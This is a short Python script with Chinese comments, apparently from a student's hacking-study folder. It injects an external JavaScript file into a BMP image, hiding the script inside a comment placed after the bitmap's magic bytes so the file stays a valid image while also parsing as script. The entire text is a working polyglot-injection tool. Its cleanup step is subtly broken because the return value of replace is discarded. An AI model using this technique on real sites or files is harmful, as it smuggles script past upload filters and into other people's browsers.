fname = "E:\STUDY\ownpython\网络安全\应用程序黑客攻击\图片文件黑客攻击\pic\\1.bmp"
pfile = open(fname, "r+b")  # 以二进制打开读取图片
buff = pfile.read()
#替换掉可能引发错误的*与/
buff.replace(b'\x2A\x2F', b'\x00\x00')
pfile.close()

pfile = open(fname, "w+b")
pfile.write(buff)
#以起始位置为基准，光标后移两位
pfile.seek(2, 0)
pfile.write(b'\x2F\x2A')  # 插入注释，在“魔数”后插入代表注释开始的标识
pfile.close()  # “魔数”正确，浏览器即可识别为位图文件，无论图像数据是否损坏

pfile = open(fname, "ab")
pfile.write(b'\xFF\x2A\x2F\x3D\x31\x3B')
pfile.write(
    open('E:\STUDY\ownpython\网络安全\应用程序黑客攻击\图片文件黑客攻击\hello.js', 'rb').read())  # 插入js脚本
pfile.close()
print('插入成功!')
